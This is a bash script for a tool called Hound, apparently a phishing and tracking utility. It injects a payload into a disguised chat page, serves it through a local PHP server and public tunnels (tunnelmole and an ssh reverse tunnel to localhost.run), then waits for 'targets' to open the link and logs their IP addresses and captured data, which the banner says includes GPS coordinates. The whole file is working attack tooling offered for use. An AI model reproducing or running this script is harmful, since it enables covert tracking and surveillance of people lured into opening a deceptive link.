#!/bin/bash
# Hound v 0.2
# Powered by TechChip
# visit https://youtube.com/techchipnet
# Fixed by Alienkrishn [Anon4You]
# Fix - public link
#

trap 'printf "\n";stop' 2

banner() {
clear
printf '\n       ██   ██  ██████  ██    ██ ███    ██ ██████ \n' 
printf '       ██   ██ ██    ██ ██    ██ ████   ██ ██   ██ \n'
printf '       ███████ ██    ██ ██    ██ ██ ██  ██ ██   ██ \n'
printf '       ██   ██ ██    ██ ██    ██ ██  ██ ██ ██   ██ \n'
printf '       ██   ██  ██████   ██████  ██   ████ ██████  \n\n'
printf '\e[1;31m       ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n'                                                                                
printf " \e[1;93m      Hound Ver 0.2 - by Anil Parashar [TechChip]\e[0m \n"
printf " \e[1;92m      www.techchip.net | youtube.com/techchipnet \e[0m \n"
printf "\e[1;90m Hound is a simple and light tool for information gathering and capture GPS coordinates.\e[0m \n"
printf "\n"
}


stop() {
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1 
}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
cat ip.txt >> saved.ip.txt

}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt
tail -f -n 110 data.txt
fi
sleep 0.5
done 
}

hosting(){
  echo -e "\nif links are not shown relaunch the script $0\n"
  sleep 2
  printf "\e[32;1mStarting PHP server...\r"
  php -S localhost:8080 > /dev/null 2>&1 &
  sleep 2
  printf "Starting tunnulmols tunnel...\r"
  tmole 8080 > .srvlog 2> /dev/null &
  sleep 3
  printf "Starting localhost tunnel...\r"
  ssh -R 80:localhost:8080 nokey@localhost.run > .lhrlog 2> /dev/null &
  sleep 10
  link=$(grep -o 'https://[-0-9a-z]*\.tunnelmole.net' ".srvlog")
  lhlink=$(grep -o 'https://[-0-9a-z]*\.lhr.life' ".lhrlog")
  rm -rf .lhrlog .srvlog
  echo -e "\e[32;1myour links are given bellow \e[34;1m\n"
  echo Public Link : $link
  echo ""
  echo Public Link : $lhlink
  echo -e "\nLocalHost  : http://localhost:8080"
  checkfound
}

hound(){
if [[ -e data.txt ]]; then
cat data.txt >> targetreport.txt
rm -rf data.txt
touch data.txt
fi
if [[ -e ip.txt ]]; then
rm -rf ip.txt
fi
sed -e '/tc_payload/r payload' index_chat.html > index.html
read -p "Start hound tool? [Y/n]> " choise
if [[ $choise == Y || $choise == yes ]]; then
  hosting 
else
  echo "Exiting..."; sleep 1 
  exit 0 
fi
}

banner
hound
